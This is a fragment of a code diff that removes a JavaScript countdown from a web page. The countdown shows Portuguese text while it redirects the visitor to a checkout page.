-            redirectCountdownText.textContent = `Redirecionando para o checkout seguro em ${redirectSeconds}s...`;
-
-            redirectTimerInterval = setInterval(() => {
-              redirectSeconds--;
-              if (redirectSeconds > 0) {
-                redirectCountdownText.textContent = `Redirecionando para o checkout seguro em ${redirectSeconds}s...`;
-              } else {
-                clearInterval(redirectTimerInterval);
-                redirectCountdownText.textContent = 'Redirecionando agora...';
-                goToCheckout();
-              }
-            }, 1000);
-          }
-        }, 40);
-      });
-
     });
   </script>
 </body>
